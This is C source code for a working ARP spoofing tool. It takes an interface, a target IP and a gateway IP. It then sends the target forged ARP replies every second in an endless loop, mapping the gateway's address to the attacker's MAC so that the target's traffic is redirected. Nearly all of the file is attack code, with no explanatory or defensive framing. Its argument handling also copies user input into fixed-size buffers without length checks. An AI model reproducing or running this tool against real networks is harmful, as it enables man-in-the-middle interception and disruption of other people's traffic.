#include <unistd.h>
#include <errno.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/poll.h>
#include <sys/ioctl.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <netinet/udp.h>
#include <netinet/ip.h>
#include <stdio.h>
#include <string.h>
#include <stdarg.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include "getmac.h"

#define ARPOP_REQUEST		1
#define ARPOP_REPLY			2
#define u_char unsigned		char
#define u_short unsigned	short
#define u_int unsigned		int

typedef struct
{
	u_char mac_src[6];
	u_char mac_dst[6];
	u_short type;
}ETH_HEADER;

typedef struct
{
	u_short hw_type;
	u_short protocol_type;
	u_char hw_len;
	u_char protocol_len;
	u_short op;
	u_char mac_src[6];
	u_int ip_src;
	u_char mac_dst[6];
	u_int ip_dst;
}ARP_HEADER;

typedef struct
{
//	ETH_HEADER eth_header;
//	ARP_HEADER arp_header;
	u_char eth_mac_dst[6];
	u_char eth_mac_src[6];
	u_short type;
	
	u_short hw_type;
	u_short protocol_type;
	u_char hw_len;
	u_char protocol_len;
	u_short op;
	u_char mac_src[6];
	u_char ip_src[4];
	u_char mac_dst[6];
	u_char ip_dst[4];
	
	char pad[4];
}ARP_CHEAT;

int arp_spoof(ARP_CHEAT *arp, char *interface_name)
{
	int sockfd = -1;
	int ret = -1;
	ARP_CHEAT arp_send;
	struct sockaddr_ll addr;
	
	memset(&arp_send, 0, sizeof(arp_send));
	memcpy(&arp_send, arp, sizeof(ARP_CHEAT));

	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sockfd < 0)
	{
		printf("create socket error\n");
		return -1;
	}

	memset(&addr, 0, sizeof(addr));
	addr.sll_family = AF_PACKET;
	addr.sll_ifindex = get_iface_index(sockfd, interface_name);
	addr.sll_protocol = htons(ETH_P_ARP);

	while (1)
	{
		if (sendto(sockfd, &arp_send, sizeof(arp_send), 0, (struct sockaddr *)&addr, sizeof(addr)) != sizeof(arp_send))
		{
			printf("send to arp spoof error. errno=%d\n", errno);
			return -1;
		}
		sleep(1);
		printf("send arp spoof success\n");
	}
	
	return 0;
}

int main(int argc, char **argv)
{
	int op = 0;
	ARP_CHEAT arpspoof;
	u_char target_ip[20];
	u_char gateway_ip[20];
	char if_name[10];
	u_char mac_src[6];
	u_char mac_dst[6];
	u_int tip;
	u_int gip;
	u_int myip;
	
	memset(&arpspoof, 0, sizeof(arpspoof));
	memset(target_ip, 0, sizeof(target_ip));
	memset(gateway_ip, 0, sizeof(gateway_ip));
	memset(if_name, 0, sizeof(if_name));
	memset(mac_src, 0, sizeof(mac_src));
	memset(mac_dst, 0, sizeof(mac_dst));
	
	opterr = 0;  
	while ((op = getopt(argc, argv, "i:t:g:")) != -1)
	{
		switch(op)
		{
			case 'i':
				memcpy(if_name, optarg, strlen(optarg));
				break;
			case 't':
				memcpy(target_ip, optarg, strlen(optarg));
				break;
			case 'g':
				memcpy(gateway_ip, optarg, strlen(optarg));
				break;
			default:  
				printf("other option :%c\n",op);  
		}
	}

	printf("if_name = %s.\n", if_name);
	printf("target_ip = %s.\n", target_ip);
	printf("gateway_ip = %s.\n", gateway_ip);
	
	tip = inet_addr(target_ip);
	gip = inet_addr(gateway_ip);
	printf("tip = %u, gip = %u.\n", tip, gip);
	
	myip = get_ipaddr_macaddr(if_name, mac_src);
	get_target_mac_addr(if_name, tip, mac_dst);
	
	memcpy(&arpspoof.eth_mac_dst, mac_dst, sizeof(mac_dst));
	memcpy(&arpspoof.eth_mac_src, mac_src, sizeof(mac_src));
	arpspoof.type = htons(0x0806);
	
	arpspoof.hw_type = htons(ARPHRD_ETHER);
	arpspoof.protocol_type = htons(ETH_P_IP);
	arpspoof.hw_len = 6;
	arpspoof.protocol_len = 4;
	arpspoof.op = htons(2);

	memcpy(&arpspoof.mac_src, mac_src, sizeof(mac_src));
	memcpy(&arpspoof.ip_src[0], &gip, 4);
	memcpy(&arpspoof.mac_dst, mac_dst, sizeof(mac_dst));
	memcpy(&arpspoof.ip_dst[0], &tip, 4);

	printf("sizeof(arpspoof) = %d\n", sizeof(arpspoof));
	printf("build arp packet success, start arp spoof.\n");
	arp_spoof(&arpspoof, if_name);
	
	return 0;
}